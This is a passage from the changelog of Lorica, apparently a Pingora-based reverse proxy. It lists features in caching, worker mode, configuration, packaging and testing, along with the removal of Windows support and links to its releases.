- Path rule cache overrides for sub-path-specific caching
- X-Cache-Status response header (HIT/MISS/STALE/REVALIDATED/BYPASS)
- Cache purge and stats APIs

**Worker Mode**

- Process-based worker isolation: supervisor forks N workers, passes listening sockets via SCM_RIGHTS
- Protobuf command channel over Unix socketpair for ConfigReload, heartbeat monitoring (5s interval)
- Graceful shutdown with 30s drain timeout then SIGKILL
- Real-time access log forwarding via Unix domain socket (log.sock) with sub-millisecond latency
- WAF engine in supervisor with global auto-ban counter aggregation across workers
- TLS termination, SLA collection, load testing, notification dispatch all functional in worker mode
- Worker PIDs, health status, and heartbeat latency visible in System dashboard
- Exponential restart backoff (1s-30s), supervisor closes listening sockets after spawning

**Configuration**

- Embedded SQLite database with WAL mode, CRUD for all entities, 13+ schema migrations
- AES-256-GCM encryption for certificate private keys and notification configs at rest
- TOML config export/import with preview and diff, DNS provider CRUD with encrypted credentials
- REST API on localhost:9443 via axum with session-based auth, sliding window session renewal, rate-limited login
- CLI with `--version`, `--data-dir`, `--log-level`, `--management-port`, `--http-port`, `--https-port`, `--workers`, `--upstream-crl-file`
- OpenAPI 3.0.3 specification covering all 85+ endpoints
- IP blocklist and WAF disabled rules persisted in GlobalSettings and restored on restart

**Packaging**

- `.deb` package with systemd service, user creation, permissions, service enable/auto-restart on upgrade
- `.rpm` spec with equivalent packaging
- Security-hardened systemd unit (ProtectSystem, PrivateTmp, NoNewPrivileges, MemoryDenyWriteExecute, SystemCallFilter, LimitNOFILE=65536)
- GitHub Actions CI pipeline (lint, test, build, package) with GPG-signed release artifacts
- NOTICE file crediting Cloudflare Pingora, FORK.md documenting fork lineage

**Testing**

- 892 Rust unit tests across 25 crates (463 product + 429 forked Pingora), 119 frontend Vitest tests, 350+ E2E Docker assertions across standalone and worker modes
- Docker Compose E2E test suite with 350+ assertions across 65+ sections (standalone + worker modes)
- Fuzz testing targets for WAF evaluation and API input
- Reproducible benchmark suite using oha in Docker (single-process, multi-worker, WAF, cache scenarios)
- Performance tuning guide with kernel sysctl, fd limits, worker sizing, cache and rate limit tuning

### Removed

- Windows support removed from forked Pingora crates (Linux-only)

[1.3.0]: https://github.com/Rwx-G/Lorica/releases/tag/v1.3.0
[1.2.0]: https://github.com/Rwx-G/Lorica/releases/tag/v1.2.0
[1.1.0]: https://github.com/Rwx-G/Lorica/releases/tag/v1.1.0
[1.0.0]: https://github.com/Rwx-G/Lorica/releases/tag/v1.0.0
